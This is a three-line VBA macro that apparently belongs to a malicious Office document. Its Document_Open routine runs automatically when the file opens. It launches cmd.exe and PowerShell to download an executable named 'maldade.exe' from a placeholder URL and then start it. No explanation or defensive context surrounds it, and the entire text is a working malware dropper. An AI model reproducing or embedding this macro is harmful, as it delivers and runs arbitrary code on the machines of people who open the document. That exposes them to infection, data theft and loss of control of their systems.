Sub Document_Open()
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('<URL>','maldade.exe');Start-Process 'maldade.exe'", vbNormalFocus)
End Sub